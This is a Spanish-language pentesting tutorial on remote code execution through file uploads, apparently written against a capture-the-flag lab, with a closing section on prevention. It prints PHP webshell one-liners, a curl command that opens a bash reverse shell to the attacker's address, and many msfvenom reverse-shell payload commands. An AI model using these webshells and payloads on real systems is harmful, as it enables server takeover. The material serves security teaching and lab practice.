![RCE-explained](https://user-images.githubusercontent.com/88755387/134223792-8ba6b430-647c-4324-b23c-f597f9e50572.png)

## __Summary__

- [__¿Qué es un RCE?__](#¿Qué-es-un-RCE?)
- [__Shells__](#Shells)
    - [__Webshells__](#Webshells)
    - [__Reverse shells__](#Reverse-shells)
- [__Como prevenirse frente a RCEs__](#Como-prevenirse-frente-a-RCEs)

# __¿Qué es un RCE?__

Remote Code Execution (como su nombre indica) nos va a permitir ejecutar código de forma arbitraria en el servidor web. Si bien es probable que se trate de una cuenta de usuario web con pocos privilegios (como www-data en servidores Linux), sigue siendo una vulnerabilidad extremadamente grave. RCE a través de una aplicación web tiende a ser el resultado de subir un programa escrito en el mismo idioma que el back-end del sitio web (u otro idioma que el servidor comprenda y ejecute). Tradicionalmente, esto sería PHP, sin embargo, en la actualidad, se han vuelto más comunes otros lenguajes de back-end (Python Django y Javascript en forma de Node.js son ejemplos principales).

Hay dos formas básicas de lograr RCE en un servidor web: `webshells` y `reverse shells`. Siendo realistas, una reverse shell con todas las funciones es el objetivo ideal para un atacante; sin embargo, un webshell puede ser la única opción disponible (por ejemplo, si se ha impuesto un límite de longitud de archivo en las subidas).

# __Shells__

## __Webshells__

Supongamos que hemos encontrado una página web con un formulario de carga:

![image](https://user-images.githubusercontent.com/88755387/134217693-ad7fb98e-74a5-4556-b330-abf2e0c07a69.png)

¿Por dónde seguimos? Bueno, comencemos con un escaneo de gobuster:

```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://shell.uploadvulns.thm/ -k -x exe,php,js,py,old,bak,sh,txt,aspx,conf -t 30 -b 403,404
```

![image](https://user-images.githubusercontent.com/88755387/134218160-f1b56be2-2fcd-49ca-9361-619c1470eaa8.png)

Como podeis comprobar nos ha sacado un directorio llamado `/resources` el cual va a guardar todos los archivos que subamos al servidor.

Vamos a comprobarlo subiendo una foto normal y corriente:

![image](https://user-images.githubusercontent.com/88755387/134218653-5c2657b2-73b5-4e59-a98c-0a89f96203e3.png)

Además de subir la imagen que nosotros queramos, en la URL nos muestra una verificación de que se ha completado la subida con éxito. Si vamos al directorio mencionado anteriormente vamos a darnos cuenta de que, efectivamente, nuestra imagen se ha subido:

![image](https://user-images.githubusercontent.com/88755387/134219027-dab42baf-5b34-4afe-a320-00ebeeb3e557.png)

Tal como están las cosas, sabemos que este servidor web se ejecuta con un back-end de PHP, por lo que pasaremos directamente a la creación y carga de la shell. En la vida real, es posible que necesitemos hacer un poco más de enumeración; sin embargo, PHP es un buen lugar para comenzar independientemente.

Un webshell simple funciona tomando un parámetro y ejecutándolo como un comando del sistema. En PHP, la sintaxis sería:

```php
<?php
    echo shell_exec($_REQUEST['cmd']);
?>
```
Este código toma un parámetro GET y lo ejecuta como un comando del sistema. Luego hace eco de la salida en la pantalla. 

También existe otra maneras de hacerlo como son las dos siguientes:

```php
<?php system($_GET['cmd']); ?>
```

```php
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```

Vamos a intentar subir cualquiera de los tres códigos a ver si funciona:

![image](https://user-images.githubusercontent.com/88755387/134219919-96cc4d45-389b-4fc7-b057-d7c3847f63e1.png)

Success!

### __Getting a reverse shell from a webshell__

Hay varias formas de obtener una reverse shell desde una webshell, os voy a mostrar una el cual uso normalmente el cual funciona bastante bien:

```bash
curl 10.10.x.x/cmd.php --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/LOCALIP/443 0>&1"'
```

## __Reverse shells__

En esta parte voy a mencionar los tipos más comunes de reverse shells que podemos subir al servidor.

### __Pentestmonkey__

En primer lugar tenemos la mítica de pentestmonkey el cual la podemos descargar lanzando el siguiente comando:

```
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
```

Lo único que tendríamos que cambiar es la IP y el puerto, el cual vamos a utilizar el 443 para evitar que nos caze el firewall de la página web. Solo nos quedaría subirla y quedarnos en escucha en dicho puerto:

```
nc -lvp 443  # Linux
rlwrap nc -lvp 443  # Windows
```

### __Msfvenom__

Creando nuestro propio payload con msfvenom es otra manera de alcanzar una reverse shell en el servidor. Tenemos varios tipos, os comento los mas comunes:

#### __BASH__

```
msfvenom -p cmd/unix/reverse_bash LHOST=<LOCAL-IP> LPORT=443 -f raw > shell.sh
```

#### __PHP__

```
msfvenom -p php/meterpreter_reverse_tcp LHOST=<LOCAL-IP> LPORT=443 -f raw > shell.php
```

#### __ELF executable__

```
msfvenom -p linux/x64/shell_reverse_tcp -f elf -o shell LHOST=<LOCAL-IP> LPORT=443
```

#### __JSP - Java Meterpreter Reverse TCP__

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LOCAL-IP> LPORT=443 -f raw > shell.jsp
```

#### __PYTHON__

```
msfvenom -p cmd/unix/reverse_python LHOST=<LOCAL-IP> LPORT=443 -f raw > shell.py
```

#### __WAR__

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LOCAL-IP> LPORT=443 -f war > shell.war
```

#### __WINDOWS__

```
msfvenom -p windows/shell_reverse_tcp lhost=<local-ip> lport=PORT -f exe -o revshell.exe  # EXECUTABLE file
```

```
msfvenom -p windows/shell_reverse_tcp LHOST=<local-ip> LPORT=PORT -f aspx -o reverse.aspx  # ASPX file
```

```
msfvenom --platform windows --arch x64 --payload windows/x64/shell_reverse_tcp LHOST=<local-ip> LPORT=1337 --encoder x64/xor --iterations 9 --format msi --out exploit.msi  # MSI file
```

```
msfvenom -p windows/shell_reverse_tcp lhost=<local-ip> lport=PORT -f jsp -o revshell.jsp  # JAVA file
```

Si quereis saber más a cerca de estos payloads podeis mirar esta [cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#php) el cual es una de las mejores actualmente en cuanto a reverse shells.

# __Como prevenirse frente a RCEs__

Para que un atacante realice un ataque RCE, el sistema objetivo debe tener una vulnerabilidad preexistente para que este la aproveche. Varias vulnerabilidades podrían abrir la puerta a un ataque RCE, demasiadas para nombrarlas. Sin embargo, los siguientes tipos de vulnerabilidades son los más utilizados para perpetrar ataques RCE:

## __Unsanitized user input__

Si nuestro sitio web/aplicación permite la entrada del usuario sin tener implementadas las medidas de desinfección adecuadas, estaremos abriendo la puerta a todo tipo de comportamiento no intencional en nombre de nuestro servidor, como la ejecución de código arbitrario. No podemos confiar en la entrada del usuario, nunca. Este punto también se relaciona con la type confusion, que se explica a continuación.

## __Broken authentication__

Si las funciones de autenticación y administración de sesiones de nuestro sitio web/aplicación se implementan incorrectamente, los atacantes podrían comprometer contraseñas, claves o tokens de sesión. También podrían intentar explotar otras vulnerabilidades para asumir las identidades de otros usuarios con permisos potencialmente confidenciales. Una vez que el atacante está dentro, podría ejecutar código arbitrario y posiblemente apoderarse de nuestro servidor con los permisos adecuados.

## __Poor access control__

Access control lists (ACL) limitan los permisos de los usuarios a solo aquellos que son necesarios para que completen su trabajo. Sin los permisos debidamente segmentados, en el caso de que un atacante secuestra una cuenta de usuario que tiene privilegios de root, el daño que podría causar el atacante es considerable.

## __Buffer overflows__

Debido a que el buffer constituye una cantidad fija de RAM, las medidas de verificación de límites deben escribirse en el código para garantizar que no se exceda la capacidad del mismo. Si no existen estas medidas la cantidad de datos escritos en el buffer podría exceder su capacidad. Estos pueden destruir datos esenciales, bloquear el sistema y sobrescribir ubicaciones de memoria con código arbitrario (malware) que el sistema ejecutaría posteriormente.

## __Type confusion__

Otra vulnerabilidad comúnmente explotada es la confusión de tipos. En el software, cada vez que por el programa pasa un objeto (un archivo, una cadena, un enlace, etc) a otra parte del programa, es necesario verificar el tipo de objeto, para que el programa sepa qué hacer con él y cómo. Sin embargo, si esta verificación no está escrita en el código, es posible aprovechar esta supervisión para explotar el sistema.

Al escribir un objeto en la memoria como un `type pointer A` y luego leerlo como otro `type pointer B`, un atacante podría engañar al sistema para que ejecute código arbitrario. Si se realizaran las comprobaciones adecuadas, el puntero tipo A no podría leerse como puntero tipo B y el código malicioso no se ejecutaría.

## __Deserialization manipulation__

Siempre que un objeto se pasa de una parte del programa a otra, ese objeto primero debe serializarse (es decir, convertirse en binario). Una vez que el objeto serializado llega a su destino, debe ser deserializado (convertido de nuevo al objeto original). Los atacantes pueden aprovechar el proceso de deserialización para producir objetos anómalos que pueden manipular el sistema para ejecutar comandos no deseados.
